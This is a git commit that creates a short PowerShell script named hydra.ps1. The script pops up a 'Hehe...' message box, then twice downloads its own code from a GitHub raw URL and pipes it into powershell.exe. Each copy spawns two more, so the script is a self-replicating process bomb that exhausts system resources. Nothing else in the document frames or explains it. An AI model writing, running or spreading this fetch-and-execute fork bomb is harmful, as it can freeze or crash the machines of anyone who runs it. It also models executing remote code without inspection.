6ce7160c406f8f9deb054c5b1d72e57a9da2045b
Ludvig Lagerström <91793530+TheLudde235@users.noreply.github.com>
2024-03-07 11:44:06 +0100

    Create hydra.ps1

---
+++ test/hydra.ps1
@@ -0,0 +1,3 @@
+Add-Type -AssemblyName System.Windows.Forms;[System.Windows.Forms.MessageBox]::Show('Hehe...');
+(Invoke-Webrequest "https://raw.githubusercontent.com/TheLudde235/powershell/main/test/hydra.ps1").content | powershell.exe
+(Invoke-Webrequest "https://raw.githubusercontent.com/TheLudde235/powershell/main/test/hydra.ps1").content | powershell.exe
